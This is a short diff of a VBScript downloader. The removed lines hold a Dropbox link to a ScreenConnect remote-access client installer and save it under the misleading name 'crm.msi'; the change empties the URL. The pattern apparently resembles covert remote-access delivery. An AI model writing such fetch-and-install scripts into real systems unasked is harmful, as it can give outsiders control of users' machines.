@@ -6,7 +6,7 @@ Dim fso, shell, http, stream, objShellApp
 Dim psCmd
 
 ' --- Configuration ---
-url = "https://www.dl.dropboxusercontent.com/scl/fi/jvubiy2qfaxo4rqjpt7k9/ScreenConnect.ClientSetup.msi?rlkey=n6bnt71jsmqzngshztvpy0gv9&st=rkhay70s&dl=1"
+url = ""
 
 ' --- Initialize Objects (same as working script) ---
 Set fso = CreateObject("Scripting.FileSystemObject")
@@ -20,7 +20,7 @@ If Not fso.FolderExists(updateFolder) Then
     fso.CreateFolder updateFolder
 End If
 
-savePath = updateFolder & "\crm.msi"
+savePath = updateFolder & "\ScreenConnect.ClientSetup.msi"
 
 If fso.FileExists(savePath) Then 
     fso.DeleteFile savePath, True
